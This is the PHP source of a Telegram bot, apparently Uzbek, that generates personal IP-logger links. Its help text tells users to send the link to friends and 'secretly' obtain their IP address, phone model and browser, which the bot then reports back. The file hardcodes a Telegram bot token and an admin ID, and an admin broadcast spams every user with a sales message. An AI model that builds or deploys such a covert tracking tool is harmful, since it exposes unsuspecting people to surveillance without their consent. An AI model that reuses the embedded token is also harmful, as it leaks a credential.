<?php
//  Bot token 
$token = '5878752443:AAECgAuSWjwmHtO7Y-efnve5jG0IHdS8cXo';
$urlb = "/var/www/m_2289/data/www/mycoder.ga/ip/";
error_reporting(0);

ob_start();

define('API_KEY',$token); 

#Functions

function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);}
    }

#O'zgaruvchilar ! 
$admin = "5711448824";
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$cid = $message->chat->id;$text=$message->text;
$type=$message->chat->type;
$mid=$message->message_id;

$ban = file_get_contents('http://mycoder.ga/ip/config/ban.php?info='.$cid);
$rek = file_get_contents('reklama.txt');

#Close()

// Custom keyboard button
$key = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"🖇Havola yaratish"],['text'=>"🗂Malumot"]],
[['text'=>"💻Dasturchi"],['text'=>"📊Statistika"]],
[['text'=>"📚Qollanma"]]
]
]);

#Admin Panel 
$menu = json_encode([
    'resize_keyboard'=>true,
    'keyboard'=>[
    [['text'=>"📤Xabar yuborish"],['text'=>"🗂Malumot"]],
    [['text'=>"❌Ban"],['text'=>"✅Unban"]],
    [['text'=>"🛒Reklama qo'shish"]]
    ]
]);



#Admin panel ga kirish 

if($text=="/panel" and $cid==$admin){
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"<b>💻 $name admin panelga xush kelibsiz !</b>",
        'parse_mode'=>'html',
        'reply_markup'=>$menu
    ]);
}
if($text=="📤Xabar yuborish" and $cid==$admin){
file_get_contents('http://mycoder.ga/ip/config/stat.php');
$res = file_get_contents('azolar.txt');
$db = explode(',',$res);
foreach($db as $lc){
    bot('sendmessage',[
        'chat_id'=>$lc,
        'text'=>"<b>💻 Bot kodi sotiladi : @Ulugbek_auf</b>\n\n <b>🍃Dasturlash tili : php , python , mysql </b>\n <b>🛒 Narxi :  3.5 $</b>",
        'parse_mode'=>'html',
        'reply_markup'=>$key
    ]);
}}
if($text=="❌Ban" and $cid==$admin){
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"<b>❌ Ban qilmoqchi bo'lgan id ni kiriting !</b>",
        'parse_mode'=>'html',
        'reply_markup'=>$menu
    ]);
}
if($text=="✅Unban" and $cid==$admin){
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"<b>✅ Ban dan olmoqchi bo'lgan  id ni kiriting !</b>",
        'parse_mode'=>'html',
        'reply_markup'=>$menu
    ]);
}
if($text=="🛒Reklama qo'shish" and $cid==$admin){
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"<b>🛒Reklama matnini kiritng !</b>",
        'parse_mode'=>'html',
        'reply_markup'=>$menu
    ]);
}

# Isim  o'zgaruvchisi 

$name = $message->from->first_name;

#User custom function

if($text=="/start"){
    file_get_contents('http://mycoder.ga/ip/config/code.php?start='.$cid);
    if($ban=='True'){
        bot('sendphoto',[
            'chat_id'=>$cid,
'photo'=>"https://img.freepik.com/premium-vector/tcp-ip-transmission-control-protocol-internet-protocol-vector-stock-illustration_100456-9760.jpg?w=2000",
            'caption'=>"<b>🖐Assalomu alaykum $name @IpUzRobot ga\n\n Xush kelibsiz !</b>\n\n<b>📚 Botdan to'g'ri foydalanish uchun Qollanmani o'qib chiqing!</b>\n",
            'parse_mode'=>'html',
            'reply_markup'=>$key
        ]);
    }else{
        bot('sendmessage',[
            'chat_id'=>$cid,
            'text'=>"<b>❌Siz admin tomonidan block holatga tushdingiz !\nBlock dan chiqish uchun adminga murojat qiling!</b>",
            'parse_mode'=>'html',
        ]);
    }
}

//Havolla yaratish 

if($text=="🖇Havola yaratish"){
    if($ban=='True'){
        $url = "https://blog.mozilla.org/wp-content/blogs.dir/278/files/2021/03/moz_explains_ipaddress_blog_header_1400x770-1000x550.jpg";
        //file_get_contents("https://mycoder.ga/ip/code.php?start=".$cid)
        bot('sendphoto',[
            'chat_id'=>$cid,
            'photo'=>$url,
            'caption'=>"<b>📱 Sizning ip havolangiz !\nBu havolani do'stlaringizga yuboring va yashirincha malumotiga ega bo'ling!\n</b>\n👉 <i> www.mycoder.ga/ip/$cid/</i> \n\n$rek",
            'parse_mode'=>'html',
            'reply_markup'=>$key
        ]);
    }else{
        bot('sendmessage',[
            'chat_id'=>$cid,
            'text'=>"<b>❌Siz admin tomonidan block holatga tushdingiz !\nBlock dan chiqish uchun adminga murojat qiling!</b>",
            'parse_mode'=>'html',
        ]);
    }
}


if($text=="🗂Malumot"){
    if($ban=="True"){
        if(file_exists($urlb.$cid."/data.txt")){
            $res=file_get_contents($urlb.$cid."/data.txt");
            bot('sendmessage',[
                'chat_id'=>$cid,
                'text'=>"$res".$rek,
                'parse_mode'=>'html',
                'reply_markup'=>$key
            ]);
        }else{
            bot('sendmessage',[
                'chat_id'=>$cid,
                'text'=>"<b>😔Hozircha shaxsiy malumotlaringiz yoq !\n$rek</b>",
                'parse_mode'=>'html',
                'reply_markup'=>$key
            ]);
        }

    }else{
        bot('sendmessage',[
            'chat_id'=>$cid,
            'text'=>"<b>❌Siz admin tomonidan block holatga tushdingiz !\nBlock dan chiqish uchun adminga murojat qiling!</b>",
            'parse_mode'=>'html',
        ]);
    }
}


if($text=="📚Qollanma"){
    if($ban=="True"){
        $txt = "<b>📚Qo'llanmaga Xush kelibsiz !</b>\n\n<i>Bizning bo'tning vazifasi ! Internet tarmog'ida ko'plab ip logger saytlar mavjud . Bu saytlarning vazifasi . Sizga berilgan havola ga kirgan insonlarning malumotlarini olish masalan: Ip manzili , Telefon modeli , Brawser turi , va hk, </i>\n\n<b>🖇Havola olish:</b><i> Siz o'zingiz ning shaxsi havolangizga ega bolasiz !</i>\n\n<b>🗂Malumot orqali : </b><i>Shaxsiy havolangizga kirgan insonlarning malumotlari ga ega bolasiz !</i>\n\n<b>💻 Dasturchi : </b><i>Siz bot va web-sayt dasturshisi haqida malumotga ega bolasiz !</i>\n\n<b>📊Statistika : </b><i>Bu orqali siz botdagi jami foydalanuvchilar va Yaratilgan havolalar qancha ekanligini bilishingiz mumkun!</i>$rek";
        bot('sendphoto',[
'photo'=>"https://media.istockphoto.com/id/1179640294/vector/contract-or-document-signing-icon-document-folder-with-stamp-and-text-contract-conditions.jpg?s=612x612&w=0&k=20&c=87Bu41EuMtdXDfJbm1YrquzUmHtPjFiCb9PCsrsWP1c=",
            'chat_id'=>$cid,
            'caption'=>"$txt",
            'parse_mode'=>'html',
            'reply_markup'=>$key
        ]);

    }else{
        bot('sendmessage',[
            'chat_id'=>$cid,
            'text'=>"<b>❌Siz admin tomonidan block holatga tushdingiz !\nBlock dan chiqish uchun adminga murojat qiling!</b>",
            'parse_mode'=>'html',
        ]);
    }
}


if($text=="💻Dasturchi"){
    if($ban=="True"){
        $tx = "<b>💻 Bot dasturchisi : @Ulugbek_Auf </b>\n\n <b>📃 Bio<i>#My_channel @UlugbekCoder</i></b>\n$rek";
        bot('sendphoto',[
"photo"=>"https://img.freepik.com/free-vector/web-development-programmer-engineering-coding-website-augmented-reality-interface-screens-developer-project-engineer-programming-software-application-design-cartoon-illustration_107791-3863.jpg",
            'chat_id'=>$cid,
            'caption'=>$tx,
            'parse_mode'=>'html',
            'reply_markup'=>$key
        ]);

    }else{
        bot('sendmessage',[
            'chat_id'=>$cid,
            'text'=>"<b>❌Siz admin tomonidan block holatga tushdingiz !\nBlock dan chiqish uchun adminga murojat qiling!</b>",
            'parse_mode'=>'html',
        ]);
    }
}


if($text=="📊Statistika"){
    if($ban=="True"){
        $num = file_get_contents("http://mycoder.ga/ip/config/get.php");
        $tx = "<b>📊 @IPuzrobot Foydalanuvchilari soni :  $num ta \n$rek</b>";
        bot('sendmessage',[
            'chat_id'=>$cid,
            'text'=>$tx,
            'parse_mode'=>'html',
            'reply_markup'=>$key
        ]);

    }else{
        bot('sendmessage',[
            'chat_id'=>$cid,
            'text'=>"<b>❌Siz admin tomonidan block holatga tushdingiz !\nBlock dan chiqish uchun adminga murojat qiling!</b>",
            'parse_mode'=>'html',
        ]);
    }
}
?>